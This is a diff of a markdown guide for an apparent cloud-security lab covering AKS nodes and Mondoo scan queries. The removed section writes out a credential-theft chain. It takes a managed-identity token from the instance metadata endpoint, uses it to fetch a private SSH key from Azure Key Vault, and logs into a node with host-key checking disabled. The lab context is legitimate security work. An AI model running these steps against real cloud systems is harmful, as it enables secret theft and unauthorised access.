@@ -379,52 +379,7 @@ aks-default-41472297-vmss000000   Ready    agent   24m   v1.22.11
 aks-default-41472297-vmss000001   Ready    agent   24m   v1.22.11
 ```
 
-### Get keys from keyvault
-
-Get the instance metadata
-
-```bash
-curl -s -H Metadata:true --noproxy "*" 'http://169.254.169.254/metadata/instance?api-version=2021-02-01'
-```
-
-Extract the keyvault name
-
-```text
-{ "name": "keyvault", "value": "keyvaultLunalectric-akic" }
-```
-
-Get the token and query for the key:value
-
-```text
-TOKEN=$(curl -s "http://169.254.169.254/metadata/identity/oauth2/token?api-version=2018-02-01&resource=https%3A%2F%2Fvault.azure.net" -H "Metadata: true" | jq -r ".access_token" ) && curl -vk -s -H Metadata:true --noproxy "*" 'https://keyvaultLunalectric-akic.vault.azure.net/secrets/private-ssh-key?api-version=2016-10-01' -H "Authorization: Bearer $TOKEN"
-```
-
-Extract the ssh private key and save it in `key-ssh`
-
-```
-----BEGIN RSA PRIVATE KEY-----\nMIIJKgIBAA
-....
-```
-
-Fix the format of the ssh private key and the permissions
-
-```bash
-cat key-ssh |sed 's/\\n/\n/g' > new-ssh-key
-
-chmod 600 new-ssh-key
-```
-
-Get the public IP of the AKS node
-
-```bash
-curl -4 icanhazip.com
-```
-
-Connect via ssh to the AKS node
-
-```bash
-ssh -o StrictHostKeyChecking=no -i new-ssh-key ubuntu@40.88.137.64
-```
+### More Priv-Esc from node (google compute instance)
 
 ## Mondoo scan commands
 
@@ -506,10 +461,10 @@ List Google Compute Instances (VMs)
 gcp.compute.instances { * }
 ```
 
-Get access policies of all key stores
+Get properties of all key rings
 
 ```bash
-azure.keyvault.vaults { vaultName properties }
+gcp.project.kms.keyrings {*}
 ```
 
 ## Destroy the cluster
